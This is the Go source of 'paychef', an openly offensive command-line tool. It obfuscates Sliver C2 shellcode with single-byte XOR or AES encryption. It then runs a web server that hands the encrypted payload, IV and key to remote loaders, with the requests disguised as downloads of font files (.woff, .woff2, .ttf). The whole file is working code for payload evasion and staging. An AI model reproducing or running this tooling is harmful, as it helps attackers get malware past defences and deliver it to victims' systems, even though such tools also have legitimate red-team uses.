package main

import (
	"fmt"
	"strconv"
	"os"

	"github.com/fachrioktavian/paychef/pkg/endecoder"
	"github.com/fachrioktavian/paychef/pkg/endecryptor"
	"github.com/fachrioktavian/paychef/pkg/formatter"
	"github.com/fachrioktavian/paychef/pkg/logger"

	"github.com/spf13/cobra"
	"github.com/gofiber/fiber/v2"
)

func PrintBanner() {
	banner := `                                      
#####    ##   #   #  ####  #    # ###### ###### 
#    #  #  #   # #  #    # #    # #      #      
#    # #    #   #   #      ###### #####  #####  
#####  ######   #   #      #    # #      #      
#      #    #   #   #    # #    # #      #      
#      #    #   #    ####  #    # ###### #      
`
	println(banner)
}

func ObfuscateXor (inAppLogger *logger.InAppLogger, xor *endecoder.Xor) *cobra.Command {
	inAppLogger = inAppLogger.NewInAppLoggerExtendPrefix("obfuscate-xor")
	return &cobra.Command{
		Use:   "obfuscate-xor",
		Short: "Obfuscate shellcode using XOR",
		Run: func(cmd *cobra.Command, args []string) {
			filePath := cmd.Flag("cshellcode").Value.String()
			if filePath == "" {
				inAppLogger.Error("Path to shellcode file is required")
				return
			}
			xorKey := cmd.Flag("xorKey").Value.String()
			if xorKey == "" {
				inAppLogger.Error("XOR key is required")
				return
			}
			key, err := strconv.ParseUint(xorKey, 0, 8)
			if err != nil {
				inAppLogger.Error("Invalid XOR key", "error", err)
				return
			}
			if key > 0xFF {
				inAppLogger.Error("XOR key must be a single byte (0-255)")
				return
			}

			r := formatter.NewReader()
			o := formatter.NewOutput()
			shellcode, err := r.ReadCShellcode(filePath)
			if err != nil {
				inAppLogger.Error("Error reading shellcode", "error", err)
				return
			}
			encodedShellcode := xor.Encode(shellcode, byte(key))
			formattedShellcode := o.FormatCShellcode(encodedShellcode, nil, nil)
			inAppLogger.Info("Formatted shellcode", "formatted_shellcode", formattedShellcode)
		},
	}
}

func ObfuscateAes (inAppLogger *logger.InAppLogger, aes *endecryptor.Aes) *cobra.Command {
	inAppLogger = inAppLogger.NewInAppLoggerExtendPrefix("obfuscate-aes")
	return &cobra.Command{
		Use:   "obfuscate-aes",
		Short: "Obfuscate shellcode using AES",
		Run: func(cmd *cobra.Command, args []string) {
			filePath := cmd.Flag("cshellcode").Value.String()
			if filePath == "" {
				inAppLogger.Error("Path to shellcode file is required")
				return
			}
			aesKey := cmd.Flag("aesKey").Value.String()
			if aesKey == "" {
				inAppLogger.Error("AES key is required")
				return
			}
			r := formatter.NewReader()
			o := formatter.NewOutput()
			shellcode, err := r.ReadCShellcode(filePath)
			if err != nil {
				inAppLogger.Error("Error reading shellcode", "error", err)
				return
			}
			encryptedShellcode, iv, key, err := aes.Encrypt(shellcode, aesKey)
			if err != nil {
				inAppLogger.Error("Error encrypting shellcode", "error", err)
				return
			}

			err = os.WriteFile("encrypted_shellcode.bin", encryptedShellcode, 0644)
			if err != nil {
				inAppLogger.Error("Error writing encrypted shellcode to file", "error", err)
				return
			}
			inAppLogger.Info("Encrypted shellcode written to file", "file", "encrypted_shellcode.bin")
			err = os.WriteFile("iv.bin", iv, 0644)
			if err != nil {
				inAppLogger.Error("Error writing IV to file", "error", err)
				return
			}
			inAppLogger.Info("IV written to file", "file", "iv.bin")
			err = os.WriteFile("key.bin", key, 0644)
			if err != nil {
				inAppLogger.Error("Error writing key to file", "error", err)
				return
			}
			inAppLogger.Info("Key written to file", "file", "key.bin")

			formattedShellcode := o.FormatCShellcode(encryptedShellcode, iv, key)
			fmt.Println(formattedShellcode)
		},
	}
}

func RunServer (inAppLogger *logger.InAppLogger) *cobra.Command {
	inAppLogger = inAppLogger.NewInAppLoggerExtendPrefix("run-server")
	return &cobra.Command{
		Use:   "run-server",
		Short: "Run a server to server encoded/encrypted shellcode",
		Run: func(cmd *cobra.Command, args []string) {
			encryptedShellcodeBin := "encrypted_shellcode.bin"
			ivBin := "iv.bin"
			keyBin := "key.bin"
			encryptedShellcode, err := os.ReadFile(encryptedShellcodeBin)
			if err != nil {
				inAppLogger.Error("Error reading encrypted shellcode file", "error", err)
				return
			}
			iv, err := os.ReadFile(ivBin)
			if err != nil {
				inAppLogger.Error("Error reading IV file", "error", err)
				return
			}
			key, err := os.ReadFile(keyBin)
			if err != nil {
				inAppLogger.Error("Error reading key file", "error", err)
				return
			}
			app := fiber.New()
			app.Get("/:file.:ext", func(c *fiber.Ctx) error {
				ext := c.Params("ext")
				if ext == "woff" {
					// Serve the encrypted shellcode in binary format
					c.Set("Content-Type", "application/octet-stream")
					c.Set("Content-Disposition", "attachment; filename=encrypted_shellcode.bin")
					return c.Send(encryptedShellcode)
				} else if ext == "woff2" {
					// Serve the IV in binary format
					c.Set("Content-Type", "application/octet-stream")
					c.Set("Content-Disposition", "attachment; filename=iv.bin")
					return c.Send(iv)
				} else if ext == "ttf" {
					// Serve the key in binary format
					c.Set("Content-Type", "application/octet-stream")
					c.Set("Content-Disposition", "attachment; filename=key.bin")
					return c.Send(key)
				} else {
					return c.Status(404).SendString("File not found")
				}
			})
			
			port := cmd.Flag("port").Value.String()
			app.Listen(":" + port)
		},
	}
} 

func main() {
	PrintBanner()

	inAppLogger := logger.NewInAppLogger("paychef")
	xor := endecoder.NewXor()

	rootCmd := &cobra.Command{
		Use:   "paychef",
		Short: "payload converter: obfuscate and deobfuscate payloads",
	}

	obfuscateXorCmd := ObfuscateXor(inAppLogger, xor)
	obfuscateXorCmd.Flags().StringP("cshellcode", "s" , "", "Path to the c shellcode file from sliver")
	obfuscateXorCmd.Flags().StringP("xorKey", "x", "0xDE", "One byte of XOR key to use for obfuscation")
	obfuscateXorCmd.MarkFlagRequired("cshellcode")
	obfuscateXorCmd.MarkFlagRequired("xorKey")

	obfuscateAesCmd := ObfuscateAes(inAppLogger, endecryptor.NewAes())
	obfuscateAesCmd.Flags().StringP("cshellcode", "s" , "", "Path to the c shellcode file from sliver")
	obfuscateAesCmd.Flags().StringP("aesKey", "k", "", "32 bytes of AES key to use for obfuscation (8 string characters)")
	obfuscateAesCmd.MarkFlagRequired("cshellcode")
	obfuscateAesCmd.MarkFlagRequired("aesKey")

	runServerCmd := RunServer(inAppLogger)
	runServerCmd.Flags().StringP("port", "p", "", "Port to run the server on")
	runServerCmd.MarkFlagRequired("port")

	rootCmd.AddCommand(
		obfuscateXorCmd,
		obfuscateAesCmd,
		runServerCmd,
	)

	rootCmd.Execute()
}